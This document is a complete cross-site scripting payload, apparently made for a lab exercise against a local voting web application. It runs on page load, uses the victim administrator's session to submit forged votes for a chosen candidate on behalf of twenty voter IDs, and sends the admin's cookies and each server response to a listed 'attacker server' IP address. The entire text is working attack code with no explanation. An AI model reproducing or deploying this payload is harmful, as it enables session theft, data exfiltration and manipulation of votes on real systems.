<script type = "text/javascript">
window.onload = function() {
    // First verify script execution with an alert
    alert("XSS script is running with admin privileges");

    // Configuration for vote manipulation
    const targetElectionDate = "2024-11-30";
    const targetOfficeID = "0"; 
    const targetCandidateID = "1";
    const maxVoters = 20;
    var xhr = null;

    // Function to send vote for a specific voter ID
    function sendVote(voterId) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', 'http://localhost:8000/cgi-bin/vote.cgi', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        
        // Construct the vote data
        var data = 'voterId=' + voterId + '&election=' + targetElectionDate + '_' + targetOfficeID + '_' + targetCandidateID;
        
        xhr.onreadystatechange = function() {
            if(xhr.readyState == 4) {
                // Log results to console for testing
                console.log('Vote sent for voter ' + voterId + ' - Status: ' + xhr.status);
                
                // Also try to send result to attacker server
                try {
                    var img = new Image();
                    img.src = 'http://172.28.247.69:5555?voter=' + voterId + 
                             '&status=' + xhr.status + 
                             '&response=' + encodeURIComponent(xhr.responseText);
                } catch(e) {
                    console.log('Error sending result to attacker server:', e);
                }
            }
        };
        
        xhr.send(data);
    }

    // Log admin's cookie to console for testing
    console.log("Admin cookie:", document.cookie);

    // Try to send admin cookie to attacker server
    try {
        var img = new Image();
        img.src = 'http://172.28.247.69:5555?cookie=' + encodeURIComponent(document.cookie);
    } catch(e) {
        console.log('Error sending cookie to attacker server:', e);
    }

    // Send votes for all possible voter IDs with delay
    for(let i = 1; i <= maxVoters; i++) {
        setTimeout(function() {
            sendVote(i);
        }, i * 200);  // 200ms delay between requests to avoid overwhelming server
    }
};

</script>
